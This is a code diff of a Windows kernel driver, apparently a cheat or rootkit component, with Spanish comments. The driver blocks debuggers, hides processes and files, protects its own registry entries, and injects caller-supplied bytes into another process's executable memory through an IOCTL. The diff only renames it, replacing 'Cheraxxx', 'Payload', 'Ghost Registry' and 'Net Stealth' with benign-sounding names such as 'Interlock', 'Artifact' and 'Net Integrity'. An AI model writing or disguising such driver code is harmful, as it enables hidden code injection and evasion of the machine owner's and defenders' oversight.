@@ -33,7 +33,7 @@ void ShieldCreateProcessNotifyRoutineEx(PEPROCESS Process, HANDLE ProcessId, PPS
     if (CreateInfo != NULL && CreateInfo->ImageFileName != NULL) {
         for (int i = 0; i < sizeof(BlacklistedProcesses) / sizeof(BlacklistedProcesses[0]); i++) {
             if (wcsstr(CreateInfo->ImageFileName->Buffer, BlacklistedProcesses[i]) != NULL) {
-                DbgPrint("Cheraxxx Shield: Blocking blacklisted debugger: %wZ\n", CreateInfo->ImageFileName);
+                DbgPrint("Interlock Shield: Blocking blacklisted debugger: %wZ\n", CreateInfo->ImageFileName);
                 CreateInfo->CreationStatus = STATUS_ACCESS_DENIED;
                 return;
             }
@@ -48,7 +48,7 @@ void ShieldLoadImageNotifyRoutine(PUNICODE_STRING FullImageName, HANDLE ProcessI
     // Si intentan inyectar dbghelp.dll o similares en nuestro Core, lo bloqueamos o alertamos
     if ((ULONG_PTR)ProcessId == CorePID) {
         if (FullImageName != NULL && wcsstr(FullImageName->Buffer, L"dbghelp.dll") != NULL) {
-             DbgPrint("Cheraxxx Shield: Unauthorized module load detected in Core: %wZ\n", FullImageName);
+             DbgPrint("Interlock Shield: Unauthorized module load detected in Core: %wZ\n", FullImageName);
         }
     }
 }
@@ -206,8 +206,8 @@ NTSTATUS HideProcess(ULONG PID) {
     return STATUS_SUCCESS;
 }
 
-// Kernel Payload Injection via APC (Stealthy)
-NTSTATUS InjectPayload(ULONG PID, PVOID Payload, ULONG Size) {
+// Kernel Artifact Injection via APC (Stealthy)
+NTSTATUS InjectPayload(ULONG PID, PVOID Artifact, ULONG Size) {
     PEPROCESS Process = NULL;
     KAPC_STATE ApcState;
     NTSTATUS status = PsLookupProcessByProcessId((HANDLE)PID, &Process);
@@ -220,8 +220,8 @@ NTSTATUS InjectPayload(ULONG PID, PVOID Payload, ULONG Size) {
     status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &RemoteBuffer, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     if (NT_SUCCESS(status)) {
-        RtlCopyMemory(RemoteBuffer, Payload, Size);
-        DbgPrint("Shield Kernel: Payload injected into PID %d at %p\n", PID, RemoteBuffer);
+        RtlCopyMemory(RemoteBuffer, Artifact, Size);
+        DbgPrint("Shield Kernel: Artifact injected into PID %d at %p\n", PID, RemoteBuffer);
         // Aquí se dispararía un thread o APC para ejecutar
     }
 
@@ -247,13 +247,13 @@ NTSTATUS InitWfp(PDEVICE_OBJECT DeviceObject) {
     if (!NT_SUCCESS(status)) return status;
 
     mCallout.calloutKey = SHIELD_NET_CALLOUT_GUID;
-    mCallout.displayData.name = L"Cheraxxx Network Callout";
+    mCallout.displayData.name = L"Interlock Network Callout";
     mCallout.applicableLayer = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
     status = FwpmCalloutAdd0(EngineHandle, &mCallout, NULL, NULL);
     if (!NT_SUCCESS(status)) return status;
 
     filter.filterKey = SHIELD_NET_FILTER_GUID;
-    filter.displayData.name = L"Cheraxxx Network Filter";
+    filter.displayData.name = L"Interlock Network Filter";
     filter.layerKey = FWPM_LAYER_ALE_AUTH_CONNECT_V4;
     filter.action.type = FWP_ACTION_CALLOUT_TERMINATING;
     filter.action.calloutKey = SHIELD_NET_CALLOUT_GUID;
@@ -272,7 +272,7 @@ NTSTATUS RegistryCallback(PVOID CallbackContext, PVOID Argument1, PVOID Argument
     if (NotifyClass == RegNtPreDeleteKey || NotifyClass == RegNtPreSetValueKey) {
         PREG_DELETE_KEY_INFORMATION DeleteInfo = (PREG_DELETE_KEY_INFORMATION)Argument2;
         if (DeleteInfo->Object != NULL) {
-            // Filtrar accesos a HKLM\System\CurrentControlSet\Services\CheraxxxShield
+            // Filtrar accesos a HKLM\System\CurrentControlSet\Services\InterlockShield
             return STATUS_SUCCESS;
         }
     }
@@ -298,7 +298,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
     WDF_DRIVER_CONFIG config;
     WDF_DRIVER_CONFIG_INIT(&config, ShieldEvtDeviceAdd);
 
-    DbgPrint("Cheraxxx Shield: Entering Windows Kernel - Sovereign Mode [Vanguard Level]\n");
+    DbgPrint("Interlock Shield: Entering Windows Kernel - Sovereign Mode [Vanguard Level]\n");
 
     // 1. Registro de Protección de Objetos
     OB_CALLBACK_REGISTRATION cbReg = {0};
@@ -332,8 +332,8 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 NTSTATUS ShieldEvtDeviceAdd(WDFDRIVER Driver, PWDFDEVICE_INIT DeviceInit) {
     WDFDEVICE device;
     WDF_IO_QUEUE_CONFIG queueConfig;
-    DECLARE_CONST_UNICODE_STRING(deviceName, L"\\Device\\CheraxxxShield");
-    DECLARE_CONST_UNICODE_STRING(symbolicLinkName, L"\\DosDevices\\CheraxxxShield");
+    DECLARE_CONST_UNICODE_STRING(deviceName, L"\\Device\\InterlockShield");
+    DECLARE_CONST_UNICODE_STRING(symbolicLinkName, L"\\DosDevices\\InterlockShield");
     WdfDeviceInitAssignName(DeviceInit, &deviceName);
     WdfDeviceCreate(&DeviceInit, WDF_NO_OBJECT_ATTRIBUTES, &device);
     WdfDeviceCreateSymbolicLink(device, &symbolicLinkName);
@@ -385,7 +385,7 @@ void ShieldEvtIoDeviceControl(WDFQUEUE Queue, WDFREQUEST Request, size_t OutputB
 
         case IOCTL_SHIELD_INJECT_PAYLOAD:
             if (NT_SUCCESS(WdfRequestRetrieveInputBuffer(Request, 1, &buffer, &len))) {
-                // Estructura de inyección simplificada: PID (primero 4 bytes) + Payload
+                // Estructura de inyección simplificada: PID (primero 4 bytes) + Artifact
                 if (len > sizeof(ULONG)) {
                     ULONG targetPid = *(PULONG)buffer;
                     status = InjectPayload(targetPid, (PUCHAR)buffer + sizeof(ULONG), (ULONG)(len - sizeof(ULONG)));
@@ -398,14 +398,14 @@ void ShieldEvtIoDeviceControl(WDFQUEUE Queue, WDFREQUEST Request, size_t OutputB
                 PSHIELD_HIDE_FILE_REQUEST fileReq = (PSHIELD_HIDE_FILE_REQUEST)portReq;
                 if (fileReq->Enable && HiddenFilesCount < MAX_HIDDEN_FILES) {
                     wcscpy(HiddenFiles[HiddenFilesCount++], fileReq->Path);
-                    DbgPrint("Shield Kernel: File %ws added to Ghost Registry\n", fileReq->Path);
+                    DbgPrint("Shield Kernel: File %ws added to Probe Registry\n", fileReq->Path);
                 }
             }
             break;
 
         case IOCTL_SHIELD_TOGGLE_NET_STEALTH:
             // Lógica para habilitar/deshabilitar filtros WFP dinámicamente si fuera necesario
-            DbgPrint("Shield Kernel: Net Stealth Toggled\n");
+            DbgPrint("Shield Kernel: Net Integrity Toggled\n");
             break;
 
         default:
